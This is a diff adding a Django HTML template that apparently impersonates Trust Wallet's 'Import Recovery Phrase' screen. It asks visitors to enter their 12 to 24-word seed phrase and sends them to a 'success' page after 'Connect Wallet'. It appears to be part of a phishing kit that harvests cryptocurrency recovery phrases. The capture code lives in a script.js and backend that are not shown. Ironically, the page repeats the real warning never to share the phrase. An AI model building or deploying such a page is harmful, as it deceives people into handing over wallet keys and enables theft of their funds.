@@ -1,0 +1,48 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trust Wallet - Recovery Phrase</title>
+    <link rel="stylesheet" href="{% static "style.css" %}">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <button id="BackButton" class="back-button">←</button>
+            <h1>Import Recovery Phrase</h1>
+        </header>
+
+        <div class="warning-card">
+            <div class="warning-header">
+                <span class="shield-icon">🛡️</span>
+                <span class="warning-title">Security Warning</span>
+            </div>
+            <p>Never share your recovery phrase. Anyone with this phrase can steal your assets.</p>
+        </div>
+
+        <div class="phrase-input-container">
+            <div class="phrase-grid" id="phraseGrid"></div>
+        </div>
+
+        <div class="info-note">
+            <span class="info-icon">ℹ️</span>
+            <p>Typically 12 (sometimes 18, 24) words seperated by single spaces.</p>
+        </div>
+
+        <button id="ContinueButton" class="continue-button" disabled>Connect Wallet</button>
+    </div>
+    <script>
+        document.getElementById("BackButton").addEventListener("click", function () {
+            window.location.href = "{% url 'home' %}";
+        });
+    </script>
+    <script>
+        document.getElementById("ContinueButton").addEventListener("click", function () {
+            window.location.href = "{% url 'success' %}";
+        });
+    </script>
+    <script src="{% static 'script.js' %}"></script>
+</body>
+</html>
